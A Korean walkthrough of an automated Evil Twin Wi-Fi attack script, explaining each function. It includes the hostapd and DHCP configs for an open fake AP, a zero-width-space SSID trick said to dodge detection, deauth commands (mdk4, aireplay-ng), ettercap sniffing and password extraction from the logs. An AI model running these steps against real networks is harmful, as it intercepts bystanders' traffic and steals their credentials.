# wfast.sh 실행 흐름 정리

> 분리된 파일 기준: `main.sh`, `utils.sh`, `attacks.sh`

---

## 전체 흐름 요약

```
main()
 └─ evil_twin_attacks_menu()
      ├─ [자동] et_option="2" → monitor_option()
      ├─ [자동] et_option="4" → explore_for_targets_option()
      └─ [자동] et_option="6" → (VIF 체크) → et_dos_menu()
                                                └─ [자동] et_dos_option="3" → et_prerequisites()
                                                                               └─ prepare_et_interface()
                                                                                    └─ exec_et_sniffing_attack()
```

---

## 1. main() — `main.sh`

스크립트의 시작점. 아래 초기화 작업을 순서대로 수행한다.

| 단계 | 함수 | 설명 |
|------|------|------|
| 1 | `initialize_script_settings` | 스크립트 기본 설정 초기화 |
| 2 | `initialize_colors` | 색상 설정 |
| 3 | `env_vars_initialization` | 환경 변수 초기화 |
| 4 | `initialize_tmux` | tmux 환경 설정 (tmux 모드일 때) |
| 5 | `detect_distro_phase1/2` | 리눅스 배포판 감지 |
| 6 | `autodetect_language` | 언어 자동 감지 |
| 7 | `iptables_nftables_detection` | 방화벽 도구 감지 |
| 8 | `parse_plugins` | 플러그인 로드 |
| 9 | `docker_detection` | 도커 환경 감지 |
| 10 | `check_root_permissions` | root 권한 확인 |
| → | `evil_twin_attacks_menu()` | **Evil Twin 메뉴로 진입** |

---

## 2. evil_twin_attacks_menu() — `main.sh`

원래는 사용자가 번호를 직접 입력하는 메뉴였지만,
**필요한 옵션(2 → 4 → 6)이 코드에서 자동으로 실행**되도록 수정되어 있다.

### 옵션 2 — 모니터 모드 전환
```bash
et_option="2"
monitor_option "${interface}"
```
- 선택한 무선 인터페이스를 **모니터 모드**로 전환
- 패킷 캡처 및 공격 수행을 위한 필수 전처리

### 옵션 4 — 타겟 스캔
```bash
et_option="4"
explore_for_targets_option
```
- `airodump-ng`로 주변 AP를 스캔
- 타겟 선택 시 `bssid`, `channel`, `essid`, `enc`, `personal_network_selected` 값이 자동으로 채워짐
- 숨겨진 SSID(Hidden SSID)는 클라이언트 재연결 시 Probe Request에서 노출됨
- 일반 AP라면 옵션 4 이후 ask_bssid, ask_channel, ask_essid 모두 자동 스킵

### 옵션 6 — Evil Twin Sniffing 공격 진입
```bash
et_option="6"
```

#### VIF(Virtual Interface) 지원 여부 분기

| 조건 | 동작 |
|------|------|
| VIF 지원 O | 바로 `et_attack_adapter_prerequisites_ok=1` |
| VIF 지원 X | `ask_yesno 696 "no"` → yes 선택 시 DoS 없이 진행 |

**VIF란?**
하나의 물리 어댑터에서 가상 인터페이스를 2개 생성하는 기능.
Evil Twin 공격에서는 동시에 두 가지 역할이 필요하다.

| 역할 | 모드 | 담당 |
|------|------|------|
| DoS (deauth 패킷 전송) | 모니터 모드 | 첫 번째 인터페이스 |
| Fake AP 생성 | AP 모드 | 두 번째 인터페이스 (VIF 또는 별도 어댑터) |

**VIF 없이 진행(yes 선택) 시 결과:**
- Fake AP는 동작하지만 DoS 불가
- 피해자가 자발적으로 또는 신호 끊김 시에만 Fake AP로 연결됨
- 공격 효율 낮음

**no 선택 시:** `et_attack_adapter_prerequisites_ok`가 1이 되지 않아 공격 취소 → 메뉴 처음으로 돌아감

**어댑터 2개 사용 시:** VIF 경고 없이 정상 진행 (`secondary_wifi_interface` 사용)

#### 포트 확인 후 et_dos_menu 호출
```bash
ports_needed["udp"]="${dhcp_port}"
if check_busy_ports; then
    et_mode="et_sniffing"
    et_dos_menu
fi
```

---

## 3. et_dos_menu() — `main.sh`

DoS 공격 방식 선택 메뉴. 자동으로 **옵션 3 (Auth DoS)** 선택.

```bash
et_dos_option="3"
et_dos_attack="Auth DoS"
```

| 단계 | 함수 | 설명 |
|------|------|------|
| 1 | `dos_pursuit_mode_et_handler` | DoS 추적 모드 처리 |
| 2 | `detect_internet_interface` | 인터넷 인터페이스 감지 |
| 3 | `et_prerequisites` | **ET 공격 사전 준비** |

---

## 4. et_prerequisites() — `main.sh`

실제 공격 실행 전 최종 준비 단계. `et_sniffing` 모드 기준 흐름:

| 단계 | 코드 | 설명 | 스킵 여부 |
|------|------|------|-----------|
| 1 | `ask_yesno 277 "yes"` | 공격 시작 최종 확인 (기본값: yes) | 입력 필요 |
| 2 | `ask_yesno 419 "no"` | MAC 스푸핑 여부 (기본값: no) | 입력 필요 |
| 3 | `ask_bssid` | 타겟 BSSID | 옵션 4에서 채워지면 자동 스킵 |
| 4 | `ask_channel` | 채널 | 옵션 4에서 채워지면 자동 스킵 |
| 5 | `ask_essid "noverify"` | SSID | 옵션 4에서 채워지면 자동 스킵 (Hidden SSID면 입력 필요) |
| 6 | `validate_network_type "personal"` | 네트워크 타입 검증 | 옵션 4에서 자동 설정되어 통과 |
| 7 | `manage_ettercap_log` | 로그 저장 여부 및 경로 설정 | 입력 필요 |

### MAC 스푸핑이란?
Fake AP의 MAC 주소(BSSID)를 진짜 AP와 동일하게 위조하는 것.

| | SSID | BSSID |
|--|------|-------|
| 진짜 AP | iptime | AA:BB:CC:DD:EE:FF |
| Fake AP (스푸핑 O) | iptime | AA:BB:CC:DD:EE:FF ← 동일 |
| Fake AP (스푸핑 X) | iptime | 11:22:33:44:55:66 ← 다름 |

### validate_network_type()
`personal_network_selected` 또는 `enterprise_network_selected` 플래그 검증.
옵션 4 타겟 선택 시 AP 타입(MGT/CMAC 여부)에 따라 자동 설정되므로 별도 입력 없이 통과.

| 타입 | 특징 |
|------|------|
| personal | 일반 가정/소규모 AP, WPA/WPA2 PSK |
| enterprise | 기업용, 802.1X 인증 (MGT/CMAC) |

### manage_ettercap_log()
`et_sniffing` 모드에서 호출. 로그 저장 여부 및 경로 설정.
```
"패스워드 로그 저장할까요?" (기본값: yes)
→ yes: 파일명 = evil_twin_captured_passwords-{SSID}.txt
→ no:  로그 없이 진행
```

모드별 로그 관리 함수:
| 모드 | 함수 | 저장 내용 |
|------|------|-----------|
| et_sniffing | `manage_ettercap_log` | 패스워드 (파일 단위) |
| et_sniffing_sslstrip2 | `manage_bettercap_log` | 패스워드 (파일 단위) |
| enterprise | `manage_enterprise_log` | 크리덴셜 (폴더 단위) |

### et_prerequisites() 마지막 단계
```bash
language_strings "${language}" 296 "yellow"  # "공격 시작합니다..." 출력
language_strings "${language}" 115 "read"    # Enter 대기
prepare_et_interface()                       # 공격 시작
```

---

## 5. prepare_et_interface() — `main.sh`

모니터 모드로 전환했던 인터페이스를 **Managed 모드로 복귀**시킨다.
Fake AP 생성에는 Managed 모드가 필요하기 때문.

```bash
et_initial_state=${ifacemode}
if [ "${ifacemode}" != "Managed" ]; then
    airmon stop wlan0mon → wlan0  # Managed 모드 복귀
fi
```

이후 채널 파일 저장 및 공격 모드 분기:
```bash
echo "${channel}" > "${tmpdir}${channelfile}"  # 채널 임시 파일 저장

case ${et_mode} in
    "et_sniffing") exec_et_sniffing_attack ;;
    ...
esac
```

---

## 6. exec_et_sniffing_attack() — `attacks.sh`

실제 공격 실행 함수. 순서대로 실행된다.

| 단계 | 함수 | 역할 |
|------|------|------|
| 1 | `set_hostapd_config` | Fake AP 설정 파일 생성 |
| 2 | `launch_fake_ap` | Fake AP 실행 (hostapd) |
| 3 | `set_network_interface_data` | 네트워크 인터페이스 IP 설정 |
| 4 | `set_dhcp_config` | DHCP 설정 파일 생성 |
| 5 | `set_std_internet_routing_rules` | 인터넷 라우팅 규칙 설정 (iptables) |
| 6 | `launch_dhcp_server` | DHCP 서버 실행 (피해자에게 IP 할당) |
| 7 | `exec_et_deauth` | DoS 공격 실행 (deauth 패킷 전송) |
| 8 | `launch_ettercap_sniffing` | ettercap 트래픽 스니핑 시작 |
| 9 | `set_et_control_script` | 종료 제어 스크립트 생성 |
| 10 | `launch_et_control_window` | 컨트롤 창 실행 |
| 11 | `write_et_processes` | 실행 중인 프로세스 PID 기록 |

### set_hostapd_config 상세

#### 실행 순서
1. `get_hostapd_version()` — hostapd 버전 확인 (버전에 따라 지원 옵션이 다름)
2. `rm -rf /tmp/ag1/ag.hostapd.conf` — 기존 설정 파일 삭제 (깨끗하게 시작)
3. `generate_fake_bssid()` — 진짜 BSSID와 한 글자만 다른 가짜 BSSID 생성
4. `generate_fake_essid()` — SSID 끝에 눈에 보이지 않는 ZWSP 문자 추가
5. 설정값들을 파일에 기록

#### generate_fake_bssid()
진짜 BSSID의 11번째 문자(hex)를 랜덤으로 변경해서 가짜 BSSID 생성.
MAC 스푸핑을 안 했을 때 사용. 진짜와 최대한 비슷하게 만들어 피해자 기기가 새 AP로 인식하지 않도록 함.
```
진짜: 58:86:94:49:8C:C6
가짜: 58:86:94:49:8B:C6  ← 한 글자만 다름
```

#### generate_fake_essid()
SSID 끝에 Zero Width Space(ZWSP, \xE2\x80\x8B) 유니코드 문자를 추가.
화면에는 동일하게 보이지만 내부적으로는 다른 SSID → 보안 도구의 동일 SSID 감지 우회.
```
진짜: "deemo2.4"
가짜: "deemo2.4​"  ← 육안으로는 동일하게 보임
```

#### 생성 위치
`/tmp/ag1/ag.hostapd.conf`
- `tmpdir` = `/tmp/ag1/` (인스턴스 번호에 따라 ag1, ag2... 자동 결정)
- `hostapd_file` = `ag.hostapd.conf`

#### 생성되는 파일 내용
```
interface=wlan0
driver=nl80211
ssid=deemo2.4
bssid=58:86:94:49:8C:C6
channel=6
wpa=0               ← 암호화 없음 (Open AP, 피해자가 비밀번호 없이 연결되게)
ignore_broadcast_ssid=0
hw_mode=g           ← 2.4GHz (채널 14 이하)
ieee80211n=1        ← 지원 시 추가
```

조건부 추가 옵션:
| 조건 | 추가되는 옵션 |
|------|-------------|
| 채널 > 14 | `hw_mode=a` (5GHz) |
| 국가 코드 설정됨 | `country_code=KR` 등 |
| 802.11n 지원 | `ieee80211n=1` |
| 802.11ac 지원 | `ieee80211ac=1` |
| 802.11ax 지원 | `ieee80211ax=1` |
| 802.11be + hostapd 버전 충족 | `ieee80211be=1` |

#### 파일 생명주기
| 종료 방식 | 결과 |
|----------|------|
| 정상 종료 (메뉴 0번 or 공격 후 Enter) | `clean_tmpfiles "exit_script"` → `/tmp/ag1/` 전체 삭제 |
| 비정상 종료 (Ctrl+C, 강제 종료) | `/tmp/ag1/ag.hostapd.conf` 파일 남아있음 |

---

### launch_fake_ap 상세

#### hostapd란?
무선 랜카드를 공유기처럼 동작하게 만들어주는 프로그램.
- 실행 위치: `/usr/sbin/hostapd`
- 설정 파일을 읽어서 그대로 AP를 생성
- 실행되면 피해자 WiFi 목록에 Fake AP 신호가 잡히기 시작

| 상태 | 랜카드 역할 |
|------|------------|
| hostapd 없이 | 클라이언트 (다른 AP에 접속) |
| hostapd 실행 후 | AP (직접 신호 송출) |

#### 라인별 동작
```bash
# 1. NetworkManager 강제 종료
airmon check kill
# NetworkManager가 살아있으면 hostapd와 충돌 → Fake AP 실행 실패

# 2. MAC 스푸핑 적용 (선택 시)
set_spoofed_mac "${interface}"
# /sys/class/net/wlan0/address 에서 현재 MAC 읽어 저장 (복구용)
# /dev/urandom 으로 랜덤 MAC 생성
# ip link set wlan0 down → MAC 변경 → ip link set wlan0 up

# 3. 화면 해상도 재측정 → 창 크기/위치 계산
recalculate_windows_sizes

# 4. 실행 명령어 조합
command="hostapd /tmp/ag1/ag.hostapd.conf"

# 5. 창 위치 결정 (et_sniffing → 3번 구역)
hostapd_scr_window_position=${g3_topleft_window}

# 6. 새 xterm 창 열고 hostapd 백그라운드 실행
manage_output "-hold -bg #000000 -fg #00FF00 -T AP" "${command}" "AP"
# → xterm -hold -bg "#000000" -fg "#00FF00" -T "AP" -e "hostapd /tmp/ag1/ag.hostapd.conf" &

# 7. PID 저장 (나중에 종료할 때 사용)
et_processes+=($!)

# 8. hostapd 초기화 대기
sleep 3
```

#### manage_output()
새 터미널 창을 열고 그 안에서 명령어를 실행하는 래퍼 함수.
- xterm 모드: `xterm [옵션] -e "[명령어]" &`
- tmux 모드: `start_tmux_processes`로 새 패널 생성
- 인자: `"창 옵션"` `"실행할 명령어"` `"창 이름"`

#### launch_fake_ap 실행 후 상태
- ✅ Fake AP 신호 송출 중 (피해자 WiFi 목록에 보임)
- ❌ DHCP 서버 없음 → 연결해도 IP 못 받음
- ❌ 인터넷 라우팅 없음
- ❌ DoS 아직 시작 안 됨

### 공격 종료 후 정리
```bash
kill_et_windows        # 모든 창 종료
restore_et_interface   # 인터페이스 원상복구
parse_ettercap_log     # 캡처된 패스워드 파싱
clean_tmpfiles         # 임시 파일 정리
```

---

### set_network_interface_data 상세

**Fake AP 네트워크에서 사용할 IP 주소 범위를 설정**하는 함수.

#### IP를 4개 변수로 분리하는 이유
충돌 시 3번째 옥텟만 숫자 연산으로 변경하기 위함.
```bash
# 문자열로 관리하면 변경 불가
ip_range="192.169.1.0"

# 분리하면 숫자 연산으로 간단히 변경
third_octet=$((third_octet + 1))
# 192.169.1.0 → 192.169.2.0 → 192.169.3.0 ...
```

#### 기본 IP 대역
`192.169.x.x` 사용 — `192.168.x.x`가 아닌 이유는 공격자 시스템의 기존 네트워크와 충돌 방지.

#### IP 충돌 체크
```bash
if ip route | grep 192.169.1.0 > /dev/null; then
    # 이미 사용 중이면 third_octet을 1씩 증가하며 빈 대역 탐색
    while true; do
        third_octet=$((third_octet + 1))
        if ! ip route | grep ${ip_range} > /dev/null; then break; fi
    done
fi
```

#### 최종 설정 변수
| 변수 | 값 | 역할 |
|------|-----|------|
| `et_ip_range` | 192.169.1.0 | 네트워크 주소 |
| `et_ip_router` | 192.169.1.1 | Fake AP 게이트웨이 (공격자 IP) |
| `et_broadcast_ip` | 192.169.1.255 | 브로드캐스트 |
| `et_range_start` | 192.169.1.33 | DHCP 할당 시작 |
| `et_range_stop` | 192.169.1.100 | DHCP 할당 끝 |

피해자가 연결되면 192.169.1.33~100 사이의 IP를 받고 게이트웨이가 공격자(192.169.1.1)로 설정되어 **모든 트래픽이 공격자를 거쳐가게 됨**.

---

### set_dhcp_config 상세

**DHCP 서버 설정 파일(`/tmp/ag1/ag.dhcpd.conf`)을 생성**하는 함수.

#### 라인별 설명
```bash
rm -rf "${tmpdir}${dhcpd_file}"   # 기존 설정 파일 삭제
rm -rf "${tmpdir}clts.txt"        # 기존 클라이언트 목록 삭제
ip link set "${interface}" up     # 인터페이스 활성화
```

```bash
authoritative;              # 이 DHCP 서버가 네트워크 주인임을 선언
default-lease-time 600;     # IP 임대 기본 시간 10분
max-lease-time 7200;        # IP 임대 최대 시간 2시간
```

#### 모드별 DNS 분기
| 모드 | DNS | 이유 |
|------|-----|------|
| et_sniffing | 진짜 DNS (8.8.8.8 등) | 피해자가 정상 인터넷 사용하면서 트래픽 스니핑 |
| captive_portal | 공격자 IP (192.169.1.1) | 모든 도메인을 가짜 페이지로 redirect |

#### leases 파일 탐색
배포판마다 dhcp.leases 파일 위치가 다르기 때문에 존재하는 파일을 찾아서 설정에 포함.

#### 생성되는 파일 내용
```
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.169.1.0 netmask 255.255.255.0 {
    option broadcast-address 192.169.1.255;
    option routers 192.169.1.1;
    option subnet-mask 255.255.255.0;
    option domain-name-servers 8.8.8.8, 8.8.4.4;
    range 192.169.1.33 192.169.1.100;
}
```

---

## 핵심 변수 정리

| 변수 | 설명 |
|------|------|
| `interface` | 주 무선 인터페이스 |
| `secondary_wifi_interface` | 보조 무선 인터페이스 (어댑터 2개 시) |
| `et_mode` | Evil Twin 모드 (`et_sniffing` 등) |
| `et_dos_attack` | DoS 공격 방식 (`Auth DoS` 등) |
| `bssid` | 타겟 AP의 MAC 주소 |
| `channel` | 타겟 AP의 채널 |
| `essid` | 타겟 AP의 SSID |
| `enc` | 타겟 AP의 암호화 방식 (WPA/WPA2 등) |
| `et_attack_adapter_prerequisites_ok` | 공격 진행 가능 여부 플래그 |
| `mac_spoofing_desired` | MAC 스푸핑 여부 플래그 |
| `dos_pursuit_mode` | DoS 추적 모드 활성화 여부 |
| `personal_network_selected` | 개인 네트워크 선택 여부 플래그 |
| `enterprise_network_selected` | 기업 네트워크 선택 여부 플래그 |
| `ettercap_log` | ettercap 로그 저장 여부 플래그 |
| `tmpdir` | 임시 파일 저장 경로 (`/tmp/ag1/`) |

---

## 임시 파일 목록 (`/tmp/ag1/`)

| 파일명 | 설명 |
|--------|------|
| `ag.hostapd.conf` | Fake AP 설정 파일 |
| `ag.channelfile` | 타겟 채널 번호 |
| `ag.dhcpd.conf` | DHCP 서버 설정 파일 |

---

---

### launch_dhcp_server

새 xterm 창을 열고 **dhcpd(DHCP 서버)를 실행**하는 함수.

```bash
dhcpd -d -cf "/tmp/ag1/ag.dhcpd.conf" wlan0 2>&1 | tee -a /tmp/ag1/clts.txt
```

- `-d` → 데몬 모드 비활성 (창에서 직접 출력)
- `-cf` → 설정 파일 경로 지정
- `tee -a clts.txt` → DHCP 할당 내역을 `clts.txt`에 기록 (피해자 접속 로그)
- 창 색상: 검정 바탕 + **분홍 글씨**
- `sleep 2` → DHCP 서버 초기화 대기

이 시점부터 피해자가 Fake AP에 연결되면 **IP를 자동으로 받을 수 있게 됨.**

---

### exec_et_deauth

**DoS 공격(deauth)을 실행**하는 함수. 진짜 AP와 피해자의 연결을 강제로 끊음.

#### DoS 방식별 명령어 (Auth DoS 선택 시)
```bash
# Auth DoS → mdk4 사용
mdk4 wlan0mon a -a 58:86:94:49:8C:C6 -m

# Aireplay 방식
aireplay-ng --deauth 0 -a 58:86:94:49:8C:C6 wlan0mon

# mdk4 deauth 방식
mdk4 wlan0mon d -b /tmp/ag1/bl.txt -c 6
```

- `prepare_et_monitor` → DoS용 모니터 모드 인터페이스 준비
- 창 색상: 검정 바탕 + **빨간 글씨**
- DoS 추적 모드(`dos_pursuit_mode`)일 때 → 피해자가 채널을 바꿔도 추적하며 계속 deauth

---

### launch_ettercap_sniffing

**ettercap을 실행해서 트래픽 스니핑을 시작**하는 함수.

```bash
ettercap -i wlan0 -q -T -z -S -u -l "/tmp/ag1/ag.ettercap"
```

- `-i wlan0` → Fake AP 인터페이스에서 캡처
- `-q` → 조용한 모드
- `-T` → 텍스트 모드
- `-z` → 비프로미스큐어스 모드
- `-S` → SSL 비활성
- `-u` → 유니코드 지원 비활성
- `-l` → 로그 저장 (저장 선택 시)
- 창 색상: 검정 바탕 + **노란 글씨**

이 시점부터 Fake AP를 통해 오가는 **모든 트래픽이 캡처**됨.

---

### set_et_control_script

**공격 종료를 담당하는 별도 bash 스크립트를 `/tmp/ag1/` 에 생성**하는 함수.

생성되는 스크립트의 역할:
- `et_processes` 파일을 읽어서 **모든 프로세스 PID를 kill**
- captive_portal 모드라면 캡처된 패스워드 시도 횟수를 화면에 표시
- 사용자가 Enter를 누르면 이 스크립트가 실행되어 공격 종료

---

### launch_et_control_window

**Control 창을 열고 `set_et_control_script`에서 생성한 스크립트를 실행**하는 함수.

```bash
manage_output "-hold -bg #000000 -fg #FFFFFF -T Control" \
  "bash /tmp/ag1/ag.control_et.sh" "Control" "active"
```

- 창 색상: 검정 바탕 + **흰 글씨**
- `"active"` 인자 → 이 창이 포커스를 가짐 (사용자가 Enter를 입력하는 창)
- `et_process_control_window` 에 PID 저장

---

### write_et_processes

**실행 중인 모든 공격 프로세스 PID를 파일에 기록**하는 함수.

```bash
# et_processes 배열 → /tmp/ag1/ag.et_processes 파일에 기록
for item in "${et_processes[@]}"; do
    echo "${item}" >> "/tmp/ag1/ag.et_processes"
done
```

`set_et_control_script`에서 생성한 종료 스크립트가 이 파일을 읽어서 프로세스를 종료함.

---

### 공격 실행 중 (Enter 대기)

```bash
language_strings "${language}" 298 "yellow"  # "공격 중입니다. 종료하려면 Enter..."
language_strings "${language}" 115 "read"    # Enter 입력 대기
```

사용자가 Enter를 누를 때까지 공격이 계속 실행됨.

---

### kill_et_windows

**모든 공격 프로세스를 종료**하는 함수.

```bash
# DoS 추적 모드 프로세스 종료
kill_dos_pursuit_mode_processes

# et_processes 배열의 모든 PID 재귀적으로 kill
for item in "${et_processes[@]}"; do
    kill_pid_and_children_recursive "${item}"
done

# Control 창 종료
kill "${et_process_control_window}"
```

---

### recover_current_channel

DoS 추적 모드 사용 시 **채널 파일에서 현재 채널을 복구**하는 함수.

```bash
recovered_channel=$(cat /tmp/ag1/ag.channelfile)
channel="${recovered_channel}"
```

공격 중 피해자를 추적하며 채널이 바뀌었을 수 있으므로 최종 채널값을 복구함.

---

### restore_et_interface

**공격 전 인터페이스 상태로 원상복구**하는 함수.

```bash
# IP 주소 제거
ip addr del "192.169.1.1/255.255.255.0" dev wlan0
ip route del "192.169.1.0/24" dev wlan0

# 공격 전 모드로 복구
if et_initial_state = "Managed":
    → Managed 모드 유지
else:
    → 다시 Monitor 모드로 전환 (airmon start)

# IP 포워딩 원래 값으로 복구
control_routing_status "end"
```

---

### parse_ettercap_log

**ettercap이 캡처한 로그에서 계정/패스워드를 추출**하는 함수.

```bash
etterlog -L -p -i "/tmp/ag1/ag.ettercap.eci" | grep -E "USER:|PASS:"
```

추출 후 결과 파일 형식:
```
2024-01-01
BSSID: 58:86:94:49:8C:C6
Channel: 6
ESSID: deemo2.4
---------------
USER: admin
PASS: password123
```

캡처된 패스워드가 있으면 지정한 경로에 저장, 없으면 "캡처된 패스워드 없음" 메시지 출력.

---

## exec_et_sniffing_attack 전체 흐름 요약

```
set_hostapd_config       → Fake AP 설정 파일 생성
launch_fake_ap           → Fake AP 신호 송출 시작 (hostapd)
set_network_interface_data → IP 대역 설정
set_dhcp_config          → DHCP 설정 파일 생성
set_std_internet_routing_rules → IP포워딩 + NAT + iptables 규칙 설정
launch_dhcp_server       → DHCP 서버 실행 (피해자 IP 할당)
exec_et_deauth           → DoS 공격 시작 (피해자 강제 연결 해제)
launch_ettercap_sniffing → 트래픽 스니핑 시작
set_et_control_script    → 종료 스크립트 생성
launch_et_control_window → Control 창 실행
write_et_processes       → PID 파일 기록
  ↓ [Enter 입력 대기]
kill_et_windows          → 모든 프로세스 종료
recover_current_channel  → 채널 복구 (DoS 추적 모드 시)
restore_et_interface     → 인터페이스 원상복구
parse_ettercap_log       → 캡처된 패스워드 추출 및 저장
clean_tmpfiles           → 임시 파일 정리
```
